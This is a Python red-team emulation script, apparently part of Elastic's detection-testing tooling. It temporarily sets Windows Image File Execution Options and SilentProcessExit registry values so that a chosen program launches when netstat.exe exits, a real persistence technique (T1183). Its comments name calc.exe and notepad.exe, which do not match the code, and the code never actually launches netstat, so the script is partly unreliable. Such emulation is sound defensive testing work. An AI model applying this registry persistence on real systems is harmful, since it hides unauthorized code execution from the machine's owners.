# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Persistence using GlobalFlags
# RTA: globalflags.py
# ATT&CK: T1183
# Description: Uses GlobalFlags option in Image File Execution Options to silently execute calc.exe after the monitored
#              process (notepad.exe) is closed.

from . import common


@common.requires_os(common.WINDOWS)
def main():
    common.log("Setting up persistence using Globalflags")
    ifeo_subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe"
    spe_subkey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\netstat.exe"

    with common.temporary_reg(common.HKLM, ifeo_subkey, "GlobalFlag", 512, common.DWORD), \
            common.temporary_reg(common.HKLM, spe_subkey, "ReportingMode", 1, common.DWORD), \
            common.temporary_reg(common.HKLM, spe_subkey, "MonitorProcess", "C:\\Windows\\system32\\whoami.exe"):

        common.log("Opening and closing netstat")
        common.execute(["whoami"], shell=True)
        common.execute(['taskkill', '/F', '/IM', 'netstat.exe'])


if __name__ == "__main__":
    exit(main())
